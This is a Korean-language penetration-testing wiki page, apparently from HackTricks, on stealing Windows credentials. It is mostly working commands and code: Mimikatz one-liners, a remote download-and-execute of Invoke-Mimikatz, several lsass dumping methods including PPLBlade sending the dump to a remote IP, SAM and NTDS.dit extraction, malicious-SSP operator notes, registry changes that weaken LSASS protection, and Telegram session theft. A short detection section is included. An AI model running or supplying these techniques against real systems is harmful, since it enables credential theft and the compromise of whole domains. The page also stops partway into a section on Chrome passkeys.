# Windows 자격 증명 탈취

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz 자격 증명

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**[**이 페이지**](credentials-mimikatz.md)**에서 Mimikatz로 할 수 있는 다른 작업도 확인하세요.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**여기에서 몇 가지 가능한 자격 증명 보호 방법을 알아보세요.**](credentials-protections.md) **이러한 보호 방법은 Mimikatz가 일부 자격 증명을 추출하지 못하도록 막을 수 있습니다.**

## Meterpreter에서 자격 증명

제가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용해 피해자 시스템에서 **비밀번호와 해시를 검색하세요**.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV 우회

### Procdump + Mimikatz

**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)의 Procdump는 정식 Microsoft 도구이므로**, Defender에 탐지되지 않습니다.\
이 도구를 사용해 **lsass 프로세스를 dump하고**, **dump 파일을 다운로드한 뒤**, 파일에서 **자격 증명을 로컬로 추출**할 수 있습니다.

[SharpDump](https://github.com/GhostPack/SharpDump)를 사용할 수도 있습니다.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

이 프로세스는 [SprayKatz](https://github.com/aas-n/spraykatz)를 사용해 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe를 사용해 lsass.exe를 덤프하는 행위**를 **악성**으로 **탐지**할 수 있습니다. 이는 **"procdump.exe"와 "lsass.exe"** 문자열을 **탐지**하기 때문입니다. 따라서 procdump에 **이름 lsass.exe 대신** lsass.exe의 **PID를 인수로 전달하는** 편이 **더 은밀합니다.**

### **comsvcs.dll**을 사용해 lsass 덤프하기

`C:\Windows\System32`에 있는 **comsvcs.dll**이라는 DLL은 충돌이 발생할 경우 **프로세스 메모리를 덤프**하는 역할을 합니다. 이 DLL에는 **`MiniDumpW`**라는 **함수**가 포함되어 있으며, `rundll32.exe`를 사용해 호출하도록 설계되었습니다.\
처음 두 인수는 사용해도 결과에 영향을 주지 않지만, 세 번째 인수는 세 부분으로 나뉩니다. 첫 번째 부분은 덤프할 프로세스 ID이고, 두 번째 부분은 덤프 파일의 위치이며, 세 번째 부분은 반드시 **full**이라는 단어여야 합니다. 다른 옵션은 없습니다.\
이 세 부분을 파싱한 뒤 DLL은 덤프 파일을 생성하고 지정된 프로세스의 메모리를 해당 파일로 전송합니다.\
**comsvcs.dll**을 사용해 lsass 프로세스를 덤프하면 procdump를 업로드하고 실행할 필요가 없습니다. 이 방법은 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)에서 자세히 설명합니다.<sup>[[9]](#references)</sup>

실행에는 다음 명령을 사용합니다:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**이 프로세스는** [**lssasy**](https://github.com/Hackndo/lsassy)**로 자동화할 수 있습니다.**

### **작업 관리자로 lsass 덤프하기**

1. 작업 표시줄을 마우스 오른쪽 버튼으로 클릭하고 작업 관리자를 클릭합니다.
2. 자세히를 클릭합니다.
3. 프로세스 탭에서 "Local Security Authority Process" 프로세스를 찾습니다.
4. "Local Security Authority Process" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "Create dump file"을 클릭합니다.

### procdump로 lsass 덤프하기

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)는 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 제품군에 포함된 Microsoft 서명 바이너리입니다.

이미 생성된 전체 시스템 크래시 덤프나 접근 가능한 사용자 폴더에 있는 압축 사본에는 오프라인 분석에 사용할 자격 증명 정보가 남아 있을 수 있습니다. `MEMORY.DMP` 및 `MEMORY.7z`와 같은 파일 이름은 검토 단서일 뿐입니다. 출처와 접근 권한을 확인하고, 사용 가능한 최신 자격 증명이 들어 있다고 단정하지 마세요.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade로 lsass 덤프하기

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)는 메모리 덤프를 난독화하고 디스크에 저장하지 않은 채 원격 워크스테이션으로 전송할 수 있는 Protected Process Dumper Tool입니다.

**주요 기능**:

1. PPL 보호 우회
2. Defender의 시그니처 기반 탐지 메커니즘을 회피하기 위한 메모리 덤프 파일 난독화
3. 디스크에 저장하지 않고 RAW 및 SMB 업로드 방식으로 메모리 덤프 업로드(fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump 없이 SSP 기반으로 LSASS 덤프

Ink Dragon은 `MiniDumpWriteDump`를 호출하지 않아 해당 API의 EDR 후킹이 작동하지 않는 3단계 덤퍼인 **LalsDumper**를 사용합니다:<sup>[[3]](#references)</sup>

1. **1단계 로더 (`lals.exe`)** – `fdp.dll`에서 소문자 `d` 32개로 이루어진 플레이스홀더를 찾아 `rtu.txt`의 절대 경로로 덮어쓰고, 패치한 DLL을 `nfdp.dll`로 저장한 뒤 `AddSecurityPackageA("nfdp","fdp")`를 호출합니다. 이렇게 하면 **LSASS**가 악성 DLL을 새로운 Security Support Provider (SSP)로 로드합니다.
2. **LSASS 내부의 2단계** – LSASS가 `nfdp.dll`을 로드하면 DLL은 `rtu.txt`를 읽고, 각 바이트에 `0x20`을 XOR 연산한 뒤, 디코딩된 blob을 메모리에 매핑하고 실행을 넘깁니다.
3. **3단계 덤퍼** – 매핑된 payload는 해시된 API 이름으로 확인한 **direct syscalls**를 사용해 MiniDump 로직을 다시 구현합니다 (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom`이라는 전용 export는 `%TEMP%\<pid>.ddt`를 열고, 압축된 LSASS 덤프를 파일에 기록한 다음 핸들을 닫아 나중에 유출할 수 있게 합니다.

운영자 참고 사항:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt`를 같은 디렉터리에 두세요. 1단계에서 하드코딩된 플레이스홀더를 `rtu.txt`의 절대 경로로 덮어쓰므로, 파일을 나누면 체인이 작동하지 않습니다.
* 등록은 `nfdp`를 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`에 추가하는 방식으로 이루어집니다. 이 값을 직접 설정해 LSASS가 부팅할 때마다 SSP를 다시 로드하도록 할 수 있습니다.
* `%TEMP%\*.ddt` 파일은 압축된 덤프입니다. 로컬에서 압축을 푼 다음 Mimikatz/Volatility에 넣어 자격 증명을 추출하세요.
* `AddSecurityPackageA`가 성공하려면 `lals.exe`를 admin/SeTcb 권한으로 실행해야 합니다. 호출이 반환되면 LSASS가 악성 SSP를 투명하게 로드하고 2단계를 실행합니다.
* 디스크에서 DLL을 제거해도 LSASS에서 언로드되지는 않습니다. 레지스트리 항목을 삭제하고 LSASS를 재시작하거나(재부팅), 장기 지속성을 위해 그대로 두세요.

## CrackMapExec

### SAM 해시 덤프하기

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### 대상 DC에서 NTDS.dit 덤프하기

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### 대상 DC에서 NTDS.dit 암호 기록 덤프

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### 각 NTDS.dit 계정의 pwdLastSet 속성 표시

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEM 탈취

이 파일들은 _C:\windows\system32\config\SAM_ 및 _C:\windows\system32\config\SYSTEM_에 **위치**해야 합니다. 하지만 보호되어 있으므로 일반적인 방법으로 복사할 수는 **없습니다**.

### 레지스트리에서

이 파일들을 탈취하는 가장 쉬운 방법은 레지스트리에서 사본을 가져오는 것입니다:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**해당 파일들을** Kali 머신에 **다운로드**하고 다음을 사용해 **해시를 추출**하세요:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### 볼륨 섀도 복사본

이 서비스를 사용해 보호된 파일을 복사할 수 있습니다. Administrator 권한이 필요합니다.

#### vssadmin 사용

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

하지만 **Powershell**에서도 똑같이 할 수 있습니다. 다음은 **SAM 파일을 복사하는 방법**의 예입니다(사용하는 하드 드라이브는 "C:"이고 파일은 C:\users\Public에 저장됩니다). 하지만 이 방법으로 보호된 파일은 무엇이든 복사할 수 있습니다:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

책의 코드: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

마지막으로 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용해 SAM, SYSTEM, ntds.dit의 복사본을 만들 수도 있습니다.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** 파일은 **Active Directory**의 핵심으로 알려져 있으며, 사용자 개체, 그룹, 그룹 멤버십에 관한 중요한 데이터를 보관합니다. 도메인 사용자의 **password hashes**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 있습니다.

이 데이터베이스에는 다음 세 가지 주요 테이블이 있습니다.

- **Data Table**: 사용자 및 그룹과 같은 개체의 세부 정보를 저장합니다.
- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
- **SD Table**: 각 개체의 **Security descriptors**를 저장하여 저장된 개체의 보안과 액세스 제어를 보장합니다.

Christoffer Andersson의 데이터베이스 계층 연구에는 이러한 테이블과 버전별 동작이 더 자세히 기록되어 있습니다.<sup>[[8]](#references)</sup>

Windows는 _Ntdsa.dll_을 사용해 해당 파일과 상호작용하며, _lsass.exe_가 이를 사용합니다. 따라서 **NTDS.dit** 파일의 일부가 **`lsass` 메모리 내부에** 있을 수 있습니다(성능 향상을 위해 **cache**를 사용하므로 최근에 액세스한 데이터를 찾을 수 있습니다).

#### NTDS.dit 내부의 hashes 복호화

hash는 세 번 암호화됩니다.

1. **BOOTKEY**와 **RC4**를 사용해 Password Encryption Key (**PEK**)를 복호화합니다.
2. **PEK**와 **RC4**를 사용해 **hash**를 복호화합니다.
3. **DES**를 사용해 **hash**를 복호화합니다.

**PEK**는 모든 도메인 컨트롤러에서 **같은 값**이지만, 해당 도메인 컨트롤러의 **SYSTEM** 하이브에서 가져온 DC별 **BOOTKEY**로 **NTDS.dit** 내부에서 **암호화**되어 있습니다. 따라서 자격 증명을 추출하려면 **NTDS.dit**와 **SYSTEM**(`C:\Windows\System32\config\SYSTEM`)이 모두 필요합니다.

별도의 [kernel handle-table redirection technique](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md)을 사용하면 VSS 없이 이미 열린 NTDS 파일 개체를 복사할 수 있지만, 도메인 컨트롤러에서 임의의 kernel read/write primitive가 필요합니다.<sup>[[16]](#references)</sup>

### Ntdsutil을 사용해 NTDS.dit 복사하기

Windows Server 2008부터 사용할 수 있습니다.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

볼륨 섀도 복사본([**volume shadow copy**](#stealing-sam-and-system)) 기법을 사용해 **ntds.dit** 파일을 복사할 수도 있습니다. **SYSTEM 파일**도 복사해야 한다는 점을 기억하세요(다시 말해, [**레지스트리에서 덤프하거나 볼륨 섀도 복사본을 사용하는**](#stealing-sam-and-system) 기법을 쓰세요).

### **NTDS.dit에서 hashes 추출하기**

**NTDS.dit** 및 **SYSTEM** 파일을 **확보한** 후에는 _secretsdump.py_ 같은 도구를 사용해 **hashes를 추출**할 수 있습니다:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

유효한 도메인 관리자 계정을 사용해 **자동으로 추출**할 수도 있습니다:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**큰 NTDS.dit 파일**은 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용해 추출하는 것을 권장합니다.

마지막으로 **metasploit module** `post/windows/gather/credentials/domain_hashdump` 또는 **mimikatz** `lsadump::lsa /inject`도 사용할 수 있습니다.

### **NTDS.dit에서 도메인 객체를 SQLite 데이터베이스로 추출하기**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하면 NTDS 객체를 SQLite 데이터베이스로 추출할 수 있습니다. 비밀 정보뿐 아니라 전체 객체와 해당 속성도 추출하므로, 원본 NTDS.dit 파일을 이미 가져온 경우 추가 정보를 추출할 수 있습니다.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive는 선택 사항이지만 secrets 복호화를 가능하게 합니다(NT & LM hashes, cleartext passwords, kerberos 또는 trust keys와 같은 supplemental credentials, NT & LM password histories). 그 밖의 정보와 함께 다음 데이터가 추출됩니다: hashes가 포함된 사용자 및 머신 계정, UAC flags, 마지막 로그인 및 비밀번호 변경 시각, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, trust 유형, 방향, 속성이 포함된 trusted domains...

## Lazagne

[여기](https://github.com/AlessandroZ/LaZagne/releases)에서 바이너리를 다운로드하세요. 이 바이너리를 사용해 여러 소프트웨어에서 자격 증명을 추출할 수 있습니다.

```
lazagne.exe all
```

## SAM 및 LSASS에서 자격 증명을 추출하는 기타 도구

### Windows credentials Editor (WCE)

이 도구를 사용하면 메모리에서 자격 증명을 추출할 수 있습니다. 여기서 다운로드하세요: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 자격 증명 추출

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM 파일에서 자격 증명 추출

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

여기에서 다운로드하세요:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7). **실행하기만 하면** 비밀번호가 추출됩니다.

## 유휴 RDP 세션 수집 및 보안 제어 약화

Ink Dragon의 FinalDraft RAT에는 `DumpRDPHistory` tasker가 포함되어 있으며, 그 기법은 모든 red-teamer에게 유용합니다:<sup>[[3]](#references)</sup>

### DumpRDPHistory 스타일의 텔레메트리 수집

* **아웃바운드 RDP 대상** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`에 있는 모든 사용자 하이브를 파싱합니다. 각 하위 키에는 서버 이름, `UsernameHint`, 마지막 쓰기 타임스탬프가 저장됩니다. PowerShell을 사용해 FinalDraft의 로직을 재현할 수 있습니다:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **인바운드 RDP 증거** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 로그에서 Event ID **21**(로그온 성공) 및 **25**(연결 끊김)를 조회해 누가 시스템을 관리했는지 파악합니다:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

어떤 Domain Admin이 정기적으로 접속하는지 파악한 뒤, 해당 사용자의 **연결이 끊긴** 세션이 아직 남아 있을 때 LalsDumper/Mimikatz로 LSASS를 덤프합니다. CredSSP + NTLM fallback으로 인해 해당 사용자의 verifier와 토큰이 LSASS에 남으며, 이를 SMB/WinRM을 통해 재사용해 `NTDS.dit`를 탈취하거나 도메인 컨트롤러에 persistence를 구축할 수 있습니다.

### FinalDraft가 노리는 레지스트리 다운그레이드

같은 implant는 credential theft를 쉽게 하기 위해 여러 레지스트리 키도 변조합니다:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1`은 인바운드 RDP에 대해 Restricted Admin을 비활성화하며, 해당 모드를 통한 pass-the-hash를 활성화하지는 않습니다. 값을 `0`으로 설정하면 대상에서 Restricted Admin이 허용되지만, 클라이언트가 `/RestrictedAdmin`을 요청하거나 Restricted Admin을 요구하는 정책을 사용해야 합니다.<sup>[[14]](#references)</sup> 해시만으로 원격 관리자 권한이 부여되지는 않습니다. [RDP 인증 사전 요구 사항](../../network-services-pentesting/pentesting-rdp.md)을 참조하세요.<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1`은 UAC 토큰 필터링을 비활성화하므로, 로컬 관리자가 네트워크를 통해 제한 없는 토큰을 받습니다.
* `DSRMAdminLogonBehavior=2`를 설정하면 DC가 온라인인 동안 DSRM 관리자가 로그온할 수 있어, 공격자가 사용할 수 있는 기본 제공 고권한 계정이 하나 더 생깁니다.
* `RunAsPPL=0`은 LSASS PPL 보호를 제거하여 LalsDumper와 같은 덤프 도구가 메모리에 쉽게 접근할 수 있게 합니다.

## hMailServer 설정 자격 증명 (침해 후)

설치 구성에 따라 정확한 설정 파일 `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, `C:\ProgramData\hMailServer\hMailServer.ini`를 확인하세요. 읽을 수 있는 비어 있지 않은 `[Security] AdministratorPassword=` 값은 hMailServer 관리 비밀번호 해시이며, Windows Administrator 비밀번호라는 증거는 아닙니다. 해당 자격 증명을 복구했더라도 Windows 계정으로 피벗하려면 비밀번호 재사용과 로그온 권한을 별도로 확인해야 합니다.

SQL CE 데이터베이스를 사용하는 설치 환경에서 INI 파일의 별도 `[Database] Password=` 값은 데이터베이스를 보호합니다. 레거시 설치 환경에서는 이 값이 정적 키 `THIS_KEY_IS_NOT_SECRET`과 4바이트 워드 엔디언 스왑을 사용해 Blowfish로 암호화됩니다. INI 파일의 hex 문자열을 다음 Python 스니펫에 사용하세요:<sup>[[2]](#references)</sup>

먼저 현재 계정으로 INI 파일과 해당 SQL CE `.sdf` 데이터베이스 **모두** 읽을 수 있는지 확인하세요. INI 비밀번호는 데이터베이스를 보호하며, 데이터베이스 내부에 저장된 메일박스 계정 해시와는 별개입니다. 사용 중인 데이터베이스는 검사하거나 업그레이드할 때 반드시 **복사본**을 사용하고, 라이브 파일은 사용하지 마세요.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

평문 비밀번호를 사용해 파일 잠금을 피하도록 SQL CE 데이터베이스를 복사하고, 32비트 공급자를 로드한 뒤 필요하면 업그레이드한 다음 해시를 조회합니다:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` 열은 hMailServer 해시 형식(hashcat 모드 `1421`)을 사용합니다. 크랙한 메일박스 비밀번호를 Windows 사용자 계정으로 피벗하는 데 활용할 수 있는 경우는 해당 비밀번호를 로컬/도메인 계정에서도 재사용하고 그 계정에 필요한 원격 로그온 권한이 있는 경우뿐입니다.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

일부 도구는 LSA 로그온 콜백 `LsaApLogonUserEx2`를 가로채 **평문 로그온 비밀번호**를 캡처합니다. 인증 패키지 콜백을 후킹하거나 래핑해 자격 증명을 **로그온 중**(해싱되기 전에) 캡처한 다음 디스크에 기록하거나 작업자에게 반환하는 방식입니다. 일반적으로 LSA에 주입하거나 LSA에 등록하는 helper를 구현한 뒤, 사용자 이름, 도메인, 비밀번호와 함께 성공한 각 대화형/네트워크 로그온 이벤트를 기록합니다.<sup>[[1]](#references)</sup>

운영 참고 사항:
- 인증 경로에 helper를 로드하려면 로컬 관리자/SYSTEM 권한이 필요합니다.
- 캡처된 자격 증명은 로그온이 발생할 때만 나타납니다(후킹 방식에 따라 대화형, RDP, 서비스 또는 네트워크 로그온).

## SSMS 저장된 연결 자격 증명 (sqlstudio.bin)

SQL Server Management Studio (SSMS)는 사용자별 `sqlstudio.bin` 파일에 저장된 연결 정보를 보관합니다. 전용 덤퍼를 사용하면 파일을 파싱해 저장된 SQL 자격 증명을 복구할 수 있습니다. 명령 출력만 반환하는 셸에서는 파일을 Base64로 인코딩한 뒤 stdout에 출력해 외부로 반출하는 경우가 많습니다.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

운영자 측에서 파일을 재구성하고 dumper를 로컬에서 실행해 자격 증명을 복구합니다:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocol을 통한 브라우저 세션 및 cookie 탈취

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop `tdata` 세션 탈취

Telegram Desktop은 권한 부여 및 계정 상태를 **`tdata`** 디렉터리에 저장합니다. 복사한 세션은 호환되는 도구로 불러와 계정 암호 없이 인증에 사용할 수 있습니다. 단, 해당 권한 부여가 유효한 동안만 가능합니다. 로컬 데이터 암호화가 활성화된 경우 stealer에게도 암호가 필요합니다. 인증된 세션을 통해 신원 데이터, 대화 및 멤버십 메타데이터, 메시지, 다운로드 가능한 미디어에 접근할 수 있습니다.<sup>[[10]](#references)</sup>

### 검색 및 수집

설치형 및 portable 레이아웃을 모두 검색합니다. Microsoft Store 패키지 이름은 다를 수 있으므로 `TelegramMessenge`가 포함된 패키지 디렉터리를 열거하고 해당 디렉터리의 `LocalCache\Roaming` 하위 트리를 검사합니다.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

일반적인 읽기에 실패하고 프로세스 토큰에 `SeBackupPrivilege`가 **이미 포함되어 활성화된 경우**, backup-aware access는 대체 수단을 제공하지만 권한을 획득하거나 프로세스 권한을 높여 주지는 않습니다. `CreateFileW`에서 `FILE_FLAG_BACKUP_SEMANTICS`를 지정하면 필요한 토큰 권한이 있는 경우 backup/restore semantics를 요청하고 파일 보안 검사를 우회할 수 있지만, 이 플래그만으로 호환되지 않는 공유 잠금이 해제되지는 않습니다.<sup>[[10]](#references)[[11]](#references)</sup>

실시간으로 잠긴 파일에는 **Volume Shadow Copy**를 만들고 읽으세요. ACL로 접근이 차단된 파일에는 `robocopy /B`를 사용하면 backup mode로 파일 및 디렉터리 ACL을 우회할 수 있습니다.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

대역폭을 고려하는 implant는 먼저 파일 경로 목록만 제출하고, C2에 이미 저장된 경로와 스냅샷 식별자를 받은 뒤 누락된 파일만 업로드할 수 있습니다. 따라서 `tdata`를 재귀적으로 열거한 뒤 소량의 증분 전송이 발생하더라도 세션 탈취에 성공했을 수 있습니다.<sup>[[10]](#references)</sup>

### 탐지 및 차단

Telegram이 아닌 프로세스가 `tdata`에 재귀적으로 접근하는 정황을 `SeBackupPrivilege` 활성화, 백업 의미 체계를 사용하는 파일 열기, VSS 활동 또는 `/B` 옵션을 사용하는 자식 `robocopy.exe` 프로세스와 연관 지어 분석합니다. 또한 `%APPDATA%`와 `%LOCALAPPDATA%\Packages`를 빠르게 열거한 뒤 같은 프로세스에서 외부로 연결하는 행위도 찾아봅니다. 침해 후에는 **Settings → Devices**(또는 **Privacy & Security → Active Sessions**)에서 알 수 없는 세션을 종료합니다. 2단계 인증을 활성화하는 것만으로는 이미 탈취된 인증이 취소되지 않습니다.<sup>[[10]](#references)[[13]](#references)</sup>

## Windows의 Chrome에서 Passkeys / WebAuthn 자격 증명 탈취

**Chrome + Google Password Manager에서 동기화된 passkeys**를 사용하는 Windows 호스트에서 **피해자 사용자**로 코드 실행 권한을 얻으면, **admin/SYSTEM 권한이 없어도** passkeys는 흥미로운 post-exploitation 표적이 됩니다.<sup>[[4]](#references)</sup>

### 흥미로운 로컬 아티팩트

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
